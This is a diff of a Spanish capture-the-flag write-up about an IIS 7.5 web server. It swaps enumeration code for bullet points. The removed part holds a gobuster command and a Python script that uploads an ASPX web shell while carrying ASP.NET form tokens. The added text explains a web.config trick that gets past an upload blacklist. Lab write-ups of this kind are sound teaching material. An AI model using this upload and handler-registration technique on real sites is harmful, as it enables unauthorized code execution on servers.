@@ -33,32 +33,9 @@ Solo web. IIS 7.5 implica Server 2008 R2: extensiones `.asp`/`.aspx`, `web.confi
 
 ## Enumeración
 
-```bash
-gobuster dir -u http://<IP>/ \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x asp,aspx,txt,config -t 50
-```
-
-```text
-/transfer.aspx   (200)
-/UploadedFiles/  (301 → 403)
-```
-
-El formulario tiene una validación JavaScript (`ValidateFile`) que solo mira la extensión en cliente. El POST necesita los tokens de ASP.NET:
-
-```python
-import requests, re
-
-s = requests.Session()
-r = s.get(f"http://{ip}/transfer.aspx")
-vs = re.search(r'__VIEWSTATE[^>]+value="([^"]+)"', r.text).group(1)
-ev = re.search(r'__EVENTVALIDATION[^>]+value="([^"]+)"', r.text).group(1)
-data = {"__VIEWSTATE": vs, "__EVENTVALIDATION": ev, "btnUpload": "Upload"}
-s.post(f"http://{ip}/transfer.aspx",
-       files={"FileUpload1": ("shell.aspx", open("shell.aspx", "rb"))}, data=data)
-```
-
-Probando extensiones: `jpg`, `png`, `gif` y `config` pasan; `aspx`, `asp` y `txt` no.
+- Solo el 80 abierto (`Microsoft IIS httpd 7.5`, `X-Powered-By: ASP.NET`): la superficie es la web.
+- `gobuster ... -x asp,aspx,txt,config` encuentra `/transfer.aspx` (formulario con `__VIEWSTATE`) y `/UploadedFiles/` (403 en el listado, pero los ficheros subidos se sirven uno a uno).
+- El filtro del formulario es una lista negra en JavaScript que cubre `.asp`/`.aspx`; `.config` no está, y en IIS 7.5 un `web.config` puede registrar un handler que trate esa extensión como ASP clásico.
 
 ## Foothold
 
